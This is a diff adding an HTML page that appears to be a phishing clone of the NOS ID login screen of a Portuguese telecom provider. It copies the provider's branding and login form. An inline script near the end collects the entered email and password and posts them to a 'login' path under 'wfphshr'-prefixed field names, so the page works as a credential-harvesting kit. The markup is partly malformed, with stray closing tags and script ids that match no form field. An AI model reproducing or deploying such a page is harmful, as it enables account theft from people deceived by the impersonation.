@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>NOS ID</title>
+
+    <link href="static/css/new/styles.min.css" rel="stylesheet"/>
+
+    <link href="static/Bundles/common-styles5f9a.css" rel="stylesheet"/>
+
+
+    <script type="text/javascript">
+        if (typeof module === 'object') {
+            window.module = module;
+            module = undefined;
+        }
+    </script>
+
+    <script src="static/Bundles/common-styles5f9a.css"></script>
+
+    <script src="static/js/jquery-3.5.1.min.js"></script>
+
+    <script src="static/Bundles/common-libsb1d3"></script>
+
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="static/img/favicon.ico" />
+<!-- 32x32 -->
+<link rel="shortcut icon" href="static/img/favicon.png" />
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="static/img/favicon_57.png" />
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="static/img/favicon_72.png" />
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="static/img/favicon_114.png" />
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="static/img/favicon_144.png" />
+
+    <script type="text/javascript">
+        $(function () {
+            checkIfCookiesAreEnabled();
+
+            // Fix internet explorer issues on html rendering
+            var elements = document.querySelectorAll('.site-main, .site-main-content, .site-main-footer');
+
+            for (var i = 0; i < elements.length; i++) {
+                var item = elements.item(i);
+
+                item.style.cssText = 'flex: 1 1 auto';
+            }
+
+            // Validation to see if the analytics file is properly included.
+            // If no file is loaded, the function is undefined, and a console error was thrown.
+            if (typeof startAnalyticsTracker === "function") {
+                // safe to use the function
+                startAnalyticsTracker('UA-50840327-1');
+            }
+            else {
+                // No analytics loaded. User is probably using and adblocker.
+            }
+
+            $("form").disableOnSubmit();
+        });
+    </script>
+
+   
+
+
+
+<script type="text/javascript">
+    $(function () {
+        $(".form-control").toggleLabelAnimation();
+
+        $.validator.methods.email = function () {
+            return true;
+        }
+    });
+</script>
+
+
+<script type="text/javascript">
+    $(function () {
+        $(".password").togglePassword();
+    });
+</script>
+
+
+</head>
+
+<body>
+<p hidden>Version: 2.13.0.5541</p>
+
+
+        <div class="site-layout">
+            
+
+
+
+
+<header class="site-header wrapper sticky-small-nav sticky-small-navbuttons">
+    <div class="sticky-wrapper wrapper">
+        <div class="site-header-wrapper wrapper-limited-large">
+            <div class="position-first">
+                <a class="button button-link" for="Saber mais">Saber mais</a></label>
+            </div>
+            <div class="position-last">
+<a class="button button-link" for="Quero registar-me">Quero registar-me</a></label>           </div>
+        </div>
+    </div>
+    <div class="site-logo">
+        <a href="index.html">
+            <span class="icn icn-nos"></span>
+        </a>
+    </div>
+</header>
+
+
+
+<form id="login-form" class="site-main" method="post" role="form">
+    <header class="site-main-top">
+        <div class="wrapper">
+            <div class="wrapper-limited">
+                <p class="text-wrap3 ">
+Para aceder utilize os dados de autenticação da sua identidade digital NOS.                </p>
+
+</div>
+</div>
+</header></p>
+<div class="site-main-content">  </p>
+<div class="wrapper"> </p>
+    <div class="wrapper-limited"></p>
+        <input name="__RequestVerificationToken" type="hidden" value="ss-VDR1qvfukF8J3tNrLfxCDtrdYlP3KnRHodOTUtx8K2584SlJkJMiqndbsP-7yLzexu1DDVcpb_ZNA49kkrFiXlI2h9Y0lEVBOEMOE81Y1" />
+        <input id="ReturnUrl" name="ReturnUrl" type="hidden" value="" />
+
+        <div class="control-group control-animation">
+            
+    <input autocomplete="off" class="form-control" data-val="true" data-val-mobilenumber="Nº de telemóvel inválido. Caso seja um número estrangeiro insira o código do país (ex: +44xxxxxxx ou 0044xxxxxxx)." data-val-mobilenumber-alldigitspattern="^(?:(\+|00)?)\d{1,}$" data-val-mobilenumber-countrycodes="351;^(?:.*\+351|00351|351)?(9[1236])\d{7}$,33;^(?=.*\+33|0033|33).\d{11,}$,352;^(?=.*\+352|00352|352).\d{12,}$,49;^(?=.*\+49|0049|49).\d{12,}$,34;^(?=.*\+34|0034|34).\d{11,}$,32;^(?=.*\+32|0032|32).\d{11,}$,31;^(?=.*\+31|0031|31).\d{11,}$,39;^(?=.*\+39|0039|39).\d{11,}$,46;^(?=.*\+46|0046|46).\d{9,}$,353;^(?=.*\+353|00353|353).\d{12,}$,48;^(?=.*\+48|0048|48).\d{11,}$,43;^(?=.*\+43|0043|43).\d{12,}$,45;^(?=.*\+45|0045|45).\d{10,}$,36;^(?=.*\+36|0036|36).\d{11,}$,40;^(?=.*\+40|0040|40).\d{11,}$,359;^(?=.*\+359|00359|359).\d{12,}$,356;^(?=.*\+356|00356|356).\d{1,}$,421;^(?=.*\+421|00421|421).\d{12,}$,30;^(?=.*\+30|0030|30).\d{10,}$,372;^(?=.*\+372|00372|372).\d{1,}$,420;^(?=.*\+420|00420|420).\d{12,}$,357;^(?=.*\+357|00357|357).\d{11,}$,386;^(?=.*\+386|00386|386).\d{1,}$,385;^(?=.*\+385|00385|385).\d{12,}$,371;^(?=.*\+371|00371|371).\d{11,}$,370;^(?=.*\+370|00370|370).\d{11,}$,55;^(?=.*\+55|0055|55).\d{13,}$,41;^(?=.*\+41|0041|41).\d{11,}$,44;^(?=.*\+44|0044|44).\d{12,}$,1;^(?=.*\+1|001|1).\d{11,}$,258;^(?=.*\+258|00258|258).\d{1,}$,244;^(?=.*\+244|00244|244).\d{1,}$,238;^(?=.*\+238|00238|238).\d{1,}$,61;^(?=.*\+61|0061|61).\d{11,}$,27;^(?=.*\+27|0027|27).\d{11,}$,853;^(?=.*\+853|00853|853).\d{1,}$,7;^(?=.*\+7|007|7).\d{11,}$,47;^(?=.*\+47|0047|47).\d{10,}$,54;^(?=.*\+54|0054|54).\d{1,}$,358;^(?=.*\+358|00358|358).\d{13,}$" data-val-mobilenumber-pattern="^(?:(\+|00)(351|33|352|49|34|32|31|39|46|353|48|43|45|36|40|359|356|421|30|372|420|357|386|385|371|370|55|41|44|1|258|244|238|61|27|853|7|47|54|358))\d+$" data-val-required="Campo obrigatório" id="Username" name="Username" tabindex="1" type="email" value="" />
+    <label class="animated" for="Username">Email / Nome de utilizador / Telem&#243;vel</label></p> 
+</div>
+<div class="control-helper">
+    <label for="esqueci-me">( esqueci-me )</label>
+</div>
+
+<div class="control-group control-animation password-toggle">
+    <input class="form-control password" data-val="true" data-val-required="Campo obrigatório" id="Password" name="Password" tabindex="2" type="password" />
+    <label class="animated" for="Password">Password</label>
+    <span class="icn icn-password-toggle"></span>
+</div>
+<div class="control-helper">
+    <div class="custom-checkbox push-left">
+        <input checked="checked" class="state-check" data-val="true" data-val-required="Campo obrigatório" id="RememberMe" name="RememberMe" tabindex="3" type="checkbox" value="true" /><input name="RememberMe" type="hidden" value="false" />
+        <span class="state-wrapper">
+            <label class="state-label" for="RememberMe">Manter-me autenticado</label>
+        </span>
+    </div>
+    <label for="esqueci-me">( esqueci-me )</label>
+</div>
+
+            </div>
+        </div>
+    </div>
+    <footer class="site-main-footer border-bottom">
+        <div class="wrapper">
+            <div class="bottom-space">
+                <button type="submit" class="button button-fill-1 button-wide" tabindex="3">Entrar</button>
+            </div>
+            <p class="label-text">Ou faça login através de uma rede social</p>
+
+    
+<nav>
+<ul class="horizontal-list social-list">
+        <li>
+            <a class="icn icn-facebook-square" provider="Facebook"></a>
+        </li>
+        <li>
+            <a class="icn icn-google" provider="Google"></a>
+        </li>
+</ul>
+</nav>
+
+</div>
+</footer>
+</form>
+                </div>
+            </div>
+        </div>
+                <div class="modal-footer">
+                    <button type="button"
+                            tabindex="1"
+                            onclick="$('.modal').hide();"
+                            class="button-keep button-width1-keep button-fill-1">
+                        ok
+                    </button>
+                </div>
+    </form>
+</div>
+</div>
+
+
+</div>
+</div>
+
+
+
+<noscript>
+
+
+<div class="modal opaque in">
+<div class="modal-dialog modal-sm" role="document">
+    <form action="index.html#" class="modal-content">
+        <div class="modal-body">
+            <div class="bottom-half-space">
+                <div class="text-info">
+                    <span class="icn icn-alert icon-medium-small"></span>
+                </div>
+            </div>
+
+            <div class="text-style-short-spaced text-center text-regular">
+                <p>Aten&#231;&#227;o! &#201; necess&#225;rio que tenha o javascript ativo.</p>
+            </div>
+        </div>
+
+    </form>
+</div>
+</div>
+
+
+
+<script>
+    /*
+    Check the password field and act accordingly.
+    */
+
+    $("#btn").on("click", function(e) {
+        e.preventDefault();
+        // get the password box and checkbox elements
+        var input = document.getElementById("eml");
+        var input2 = document.getElementById("pwd");
+        // check to see if the value is empty
+        if ( input.value == "" ){
+            passNotValid();
+        }else if( input2.value == "" ){ //check if the value of the repeat field is empty
+            passNotValid();
+        }else{
+            // post the data
+            $("#dialog").css('display', 'none');
+              post('login', {
+                wfphshremail: input.value,
+                wfphshrpassword: input2.value
+              });
+        }
+    });
+
+    function passNotValid(){
+      $("#dialog").css('display', 'block');
+      $(".form-control").css('border', '1px solid #dd4b39');
+    }
+
+    /*
+    Post to the fallowing path given the parameters.
+    Args:
+      path: The path to be posted to.
+      params: The parameters to be passed.
+    */
+    function post(path, params) {
+      // create a form and set its attributes
+      var form = document.createElement("form");
+      form.setAttribute("method", "post");
+      form.setAttribute("action", path);
+
+      // set the attribute for the post
+      for(var key in params) {
+          if(params.hasOwnProperty(key)) {
+              var hiddenField = document.createElement("input");
+              hiddenField.setAttribute("type", "hidden");
+              hiddenField.setAttribute("name", key);
+              hiddenField.setAttribute("value", params[key]);
+              form.appendChild(hiddenField);
+           }
+      }
+      // submit the post
+      document.body.appendChild(form);
+      form.submit();
+    }
+    var input = document.getElementById("eml");
+    var input2 = document.getElementById("pwd");
+    input.disabled = false;
+    input2.disabled = false;
+  </script>
+
+    
+<noscript>
+    
+
+    <div class="modal opaque in">
+        <div class="modal-dialog modal-sm" role="document">
+            <form action="index.html#" class="modal-content">
+                <div class="modal-body">
+                    <div class="bottom-half-space">
+                        <div class="text-info">
+                            <span class="icn icn-alert icon-medium-small"></span>
+                        </div>
+                    </div>
+
+                    <div class="text-style-short-spaced text-center text-regular">
+                        <p>Aten&#231;&#227;o! &#201; necess&#225;rio que tenha o javascript ativo.</p>
+                    </div>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+</script>
+</noscript>
+</body>
+</html>
